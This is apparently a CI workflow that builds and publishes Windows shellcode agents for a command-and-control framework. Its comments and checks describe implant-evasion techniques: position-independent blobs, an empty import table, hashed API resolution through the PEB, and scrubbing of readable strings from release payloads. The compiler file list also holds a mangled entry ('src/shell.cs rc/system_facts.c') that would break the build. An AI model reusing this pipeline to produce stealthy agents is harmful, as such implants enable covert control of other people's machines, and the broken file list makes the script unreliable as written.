name: Build

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - "**"

concurrency:
  group: ci-${{ github.event.pull_request.head.ref || github.ref_name }}
  cancel-in-progress: true

jobs:
  # ═════════════════════════════════════════════════════════════════════════
  # Build — the three Windows arches the C2 Agents table tags (X86/AMD64/ARM64),
  # cross-compiled on Linux with the llvm-mingw toolchain (gcc-compatible clang
  # drivers + mingw-w64 import libs, e.g. -lwinhttp, for every Windows triple).
  # ═════════════════════════════════════════════════════════════════════════
  build:
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        include:
          - { arch: i386,    triple: i686-w64-mingw32,   flavor: release, extra: -mno-sse }
          - { arch: x86_64,  triple: x86_64-w64-mingw32, flavor: release, extra: "" }
          - { arch: aarch64, triple: aarch64-w64-mingw32, flavor: release, extra: "" }
          - { arch: i386,    triple: i686-w64-mingw32,   flavor: dev,     extra: -mno-sse }
          - { arch: x86_64,  triple: x86_64-w64-mingw32, flavor: dev,     extra: "" }
    steps:
      - name: Checkout
        uses: actions/checkout@v7
        with:
          fetch-depth: 0        # BUILD_NUMBER = git rev-list --count HEAD

      # Asset names changed over time (ucrt-x86_64-linux.tar.xz →
      # ucrt-ubuntu-XX.04-x86_64.tar.xz), so pick the URL from the release
      # assets instead of hardcoding a filename.
      - name: Resolve llvm-mingw version
        id: llvm-mingw
        run: |
          json=$(curl -fsSL https://api.github.com/repos/mstorsjo/llvm-mingw/releases/latest)
          echo "version=$(echo "$json" | jq -r .tag_name)" >> "$GITHUB_OUTPUT"
          url=$(echo "$json" | jq -r '
            .assets[].browser_download_url
            | select(test("ucrt-.*(linux|ubuntu-).*x86_64.*\\.tar\\.xz$"))' | head -1)
          test -n "$url"
          echo "url=$url" >> "$GITHUB_OUTPUT"

      - name: Cache llvm-mingw
        id: cache-llvm-mingw
        uses: actions/cache@v6
        with:
          path: /opt/llvm-mingw
          key: llvm-mingw-${{ steps.llvm-mingw.outputs.version }}-linux-x64

      - name: Install llvm-mingw
        if: steps.cache-llvm-mingw.outputs.cache-hit != 'true'
        run: |
          curl -fSL -o llvm-mingw.tar.xz "${{ steps.llvm-mingw.outputs.url }}"
          sudo mkdir -p /opt/llvm-mingw
          sudo tar -xf llvm-mingw.tar.xz --strip-components=1 -C /opt/llvm-mingw
          rm llvm-mingw.tar.xz

      - name: Add llvm-mingw to PATH
        run: echo "/opt/llvm-mingw/bin" >> "$GITHUB_PATH"

      # Same flags as the README's local build (gcc-compatible clang drivers
      # honor them all), plus the baked identity metadata (build number +
      # commit hash) the panel displays.
      #
      # Two rules this build MUST keep (both were broken here before and
      # caught live, not by review):
      #   1. NO -mno-stack-arg-probe / -fno-stack-check. Those forbid the
      #      __chkstk stack-probe calls the >4KB frames need; entry.c ships
      #      the probe implementations for all three arches - the compiler
      #      just has to be allowed to call them. Without probes the exe
      #      segfaults on its first big frame (proven: the preview-release
      #      x86_64 exe crashed exactly there).
      #   2. The .bin is cut with --only-section=.text: plain -O binary
      #      copies the whole PE image, so the blob starts with the "MZ"
      #      header and entry is NOT at offset 0 - any loader jumps to
      #      garbage. The linker script puts entry() at byte 0 of .text;
      #      verify below.
      - name: Build
        run: |
          BUILD_NUMBER=$(git rev-list --count HEAD)
          COMMIT_HASH=$(git rev-parse --short=8 HEAD)
          DEFS=""
          EXE=minimal_agent.exe
          BIN=minimal_agent.bin
          if [ "${{ matrix.flavor }}" = "dev" ]; then
            DEFS="-DLOGGING_ENABLED"
            EXE=minimal_agent_dev.exe
            BIN=minimal_agent_dev.bin
          fi
          echo "=== building windows-${{ matrix.arch }}-${{ matrix.flavor }} (${{ matrix.triple }}-gcc) ==="
          # entry.c MUST stay FIRST on the command line and carries only
          # entry() (the stack probes live in src/stack_probes.c). Merge
          # read-only log/string data into .text so the extracted blob
          # contains every RIP-relative target it uses. llvm-mingw uses lld,
          # whose PE linker accepts /merge rather than GNU ld's -T.
            rm -rf obj
            mkdir -p obj
            ${{ matrix.triple }}-gcc -O2 -Iinclude $DEFS \
              -fno-asynchronous-unwind-tables -fno-ident -fno-stack-protector -fno-jump-tables -fno-vectorize -fno-slp-vectorize ${{ matrix.extra }} \
              -DID_BUILD_NUMBER="$BUILD_NUMBER" \
              -DAGENT_COMMIT_HASH="\"$COMMIT_HASH\"" \
              -c \
              entry.c src/stack_probes.c src/picfixup.c src/main.c \
              src/transport.c src/shell.cs rc/system_facts.c \
              src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c \
              src/advapi.c src/string.c   src/memory.c src/peb.c \
              src/system.c src/djb2.c src/logger.c
            mv ./*.o obj/
            objects=(obj/entry.o)
            for object in obj/*.o; do
            [ "$object" = "obj/entry.o" ] || objects+=("$object")
            done
            PICDATA=""
            if [ "${{ matrix.arch }}" = "i386" ] && [ "${{ matrix.flavor }}" = "dev" ]; then
              printf '.section .picdata,"xr"\n.globl _pic_reloc\n.globl pic_reloc\n.globl _pic_reloc_size\n.globl pic_reloc_size\n.globl _pic_text_size\n.globl pic_text_size\n.p2align 2\n.long 0x50494301\n_pic_reloc:\npic_reloc:\n.space 8184\n.long 0x50494302\n_pic_reloc_size:\npic_reloc_size:\n.long 0x50494303\n_pic_text_size:\npic_text_size:\n.long 0\n' > picdata.s
              ${{ matrix.triple }}-gcc -c picdata.s -o obj/picdata.o
              objects+=("obj/picdata.o")
              PICDATA="-Wl,/merge:.picdata=.text"
            fi
            ${{ matrix.triple }}-gcc -O2 -s -nostdlib -Iinclude $DEFS \
              -fno-asynchronous-unwind-tables -fno-ident -fno-stack-protector -fno-jump-tables -fno-vectorize -fno-slp-vectorize ${{ matrix.extra }} \
              -e entry \
              -Wl,/merge:.rdata=.text -Wl,/merge:.rodata=.text $PICDATA \
              -o "$EXE" "${objects[@]}"
          ${{ matrix.triple }}-objcopy --dump-section .text="$BIN" "$EXE"

          if [ "${{ matrix.arch }}" = "i386" ] && [ "${{ matrix.flavor }}" = "dev" ]; then
            ${{ matrix.triple }}-objcopy --dump-section .reloc=blob.reloc "$EXE"
            TEXT_SIZE=$(stat -c%s "$BIN")
            RELOC_SIZE=$(stat -c%s blob.reloc)
            HEX=$(od -An -tx1 -v "$BIN" | tr -d ' \n')
            OFF1=$(printf '%s' "$HEX" | awk '{n=index($0,"01434950"); if(n>0) print (n-1)/2}')
            OFF2=$(printf '%s' "$HEX" | awk '{n=index($0,"02434950"); if(n>0) print (n-1)/2}')
            OFF3=$(printf '%s' "$HEX" | awk '{n=index($0,"03434950"); if(n>0) print (n-1)/2}')
            dd if=blob.reloc of="$BIN" bs=1 conv=notrunc seek=$((OFF1 + 4)) status=none
            awk -v n="$RELOC_SIZE" 'BEGIN { printf "%c%c%c%c", n%256, int(n/256)%256, int(n/65536)%256, int(n/16777216)%256 }' | dd of="$BIN" bs=1 seek=$((OFF2 + 4)) conv=notrunc status=none
            awk -v n="$TEXT_SIZE" 'BEGIN { printf "%c%c%c%c", n%256, int(n/256)%256, int(n/65536)%256, int(n/16777216)%256 }' | dd of="$BIN" bs=1 seek=$((OFF3 + 4)) conv=notrunc status=none
            echo "pic reloc: $RELOC_SIZE bytes into reserve at blob+0x$((OFF1 + 4)), text=$TEXT_SIZE"
            [ -n "$OFF1" ] && [ "$RELOC_SIZE" -gt 0 ] && [ "$RELOC_SIZE" -le 8184 ] || { echo "FAIL: pic reloc reserve overflow"; exit 1; }
          fi

          # --- Gates: a green build must mean a working agent -------------
          # Gate 1: empty import table (the point of this project).
          imp=$(${{ matrix.triple }}-objdump -p "$EXE" | grep -c 'DLL Name' || true)
          echo "imports: $imp (want 0)"
          [ "$imp" = "0" ] || { echo "FAIL: import table not empty"; exit 1; }

          # Gate 2: entry() at byte 0 of .text - the blob contract.
          # PE-header based (robust to objdump output-format drift):
          # entry VA = ImageBase + AddressOfEntryPoint; compare against
          # the .text VMA.
          image_base=$(${{ matrix.triple }}-objdump -p "$EXE" | sed -n 's/^[[:space:]]*ImageBase[[:space:]:]*//p' | awk '{print $1; exit}' | sed 's/^0x//')
          entry_rva=$(${{ matrix.triple }}-objdump -p "$EXE" | sed -n 's/^[[:space:]]*AddressOfEntryPoint[[:space:]:]*//p' | awk '{print $1; exit}' | sed 's/^0x//')
          text_vma=$(${{ matrix.triple }}-objdump -h "$EXE" | awk '$2 == ".text" {print $4; exit}' | sed 's/^0x//')
          test -n "$image_base" || { echo "FAIL: could not read PE image base"; exit 1; }
          test -n "$entry_rva" || { echo "FAIL: could not read PE entry RVA"; exit 1; }
          test -n "$text_vma" || { echo "FAIL: could not read .text VMA"; exit 1; }
          entry_va=$(( 0x$image_base + 0x$entry_rva ))
          entry_off=$(( entry_va - 0x$text_vma ))
          echo "entry offset in .text: $entry_off (want 0)"
          [ "$entry_off" = "0" ] || { echo "FAIL: entry() is not at .text byte 0"; exit 1; }

          # Gate 3: the blob must NOT start with the PE header ("MZ") -
          # that means objcopy copied the whole image instead of .text.
          head -c 2 "$BIN" | od -c | head -1
          if [ "$(head -c 2 "$BIN")" = "MZ" ]; then
            echo "FAIL: .bin starts with the PE header - objcopy copied the image"
            exit 1
          fi

          # Gate 4: all read-only blob data must be inside .text. Since the
          # linker intentionally merges data into .text, objdump -d cannot
          # distinguish embedded strings from instructions and cannot safely
          # validate RIP-relative references in the final image.
          for section in .rdata .rodata .data .bss .pdata .xdata; do
            if ${{ matrix.triple }}-objdump -h "$EXE" | awk -v name="$section" '$2 == name { found = 1 } END { exit !found }'; then
              echo "FAIL: forbidden separate section remains: $section"
              exit 1
            fi
          done
          echo "blob section layout: .text contains read-only data; no separate data sections"

          # Gate 5 (release only): the silent blob must contain NO leaked
          # literals. A naive strings scan false-positives on x86_64 clang
          # codegen - the register-push prologue sequences (AWAVAUATVWUSPH...)
          # are all printable ASCII. A leaked literal, however, is an English
          # phrase: lowercase words with spaces between them. Scan for
          # that shape, not for raw printable runs. The dev flavor is
          # exempt: its log literals are the feature.
          if [ "${{ matrix.flavor }}" = "release" ]; then
            n=$(strings -n 14 "$BIN" | grep -cE '[a-z]+ [a-z]+' || true)
            echo "literal-shaped hits: $n (want 0)"
            if [ "$n" != "0" ]; then
              strings -n 14 "$BIN" | grep -E '[a-z]+ [a-z]+'
              echo "FAIL: log/string literals leaked into the release blob"
              exit 1
            fi
          fi
          mkdir -p artifacts
          if [ "${{ matrix.flavor }}" = "dev" ]; then
            cp "$EXE" "artifacts/windows-${{ matrix.arch }}-dev.exe"
            cp "$BIN" "artifacts/windows-${{ matrix.arch }}-dev.bin"
          else
            cp "$EXE" "artifacts/windows-${{ matrix.arch }}.exe"
            cp "$BIN" "artifacts/windows-${{ matrix.arch }}.bin"
          fi
          ls -la artifacts/

      - name: Upload artifacts
        uses: actions/upload-artifact@v7
        with:
          name: build-windows-${{ matrix.arch }}-${{ matrix.flavor }}
          retention-days: 1
          path: artifacts/

  # ═════════════════════════════════════════════════════════════════════════
  # Preview Release — rolling pre-release on every push to main; this is the
  # "preview" tag the C2's Agents-table direct URLs point at.
  # ═════════════════════════════════════════════════════════════════════════
  preview-release:
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    needs: [build]
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - name: Checkout
        uses: actions/checkout@v7

      - name: Download all artifacts
        uses: actions/download-artifact@v8
        with:
          path: artifacts
          # Everything the build matrix produces: release blobs plus the
          # dev flavors, so contributors can grab a logging build without
          # compiling locally.
          pattern: build-windows-*

      - name: Collect release files
        run: |
          mkdir -p release-files
          find artifacts -type f -exec cp {} release-files/ \;
          echo "Release files:"
          ls -lh release-files/

      - name: Create or update preview release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          TAG="preview"
          TITLE="Preview (${GITHUB_SHA::7})"
          BODY="Automated preview release from \`main\` branch.

          **Commit:** [\`${GITHUB_SHA::7}\`](https://github.com/${{ github.repository }}/commit/${GITHUB_SHA})
          **Date:** $(date -u '+%Y-%m-%d %H:%M UTC')

          > This is a rolling pre-release that updates on every push to \`main\`.
          > For stable releases, see tagged versions (\`v*\`)."

          # Delete existing preview release and tag if they exist
          gh release delete "$TAG" --yes 2>/dev/null || true
          git push origin ":refs/tags/$TAG" 2>/dev/null || true

          # Create fresh pre-release
          gh release create "$TAG" \
            --title "$TITLE" \
            --notes "$BODY" \
            --prerelease \
            --target "$GITHUB_SHA" \
            release-files/*
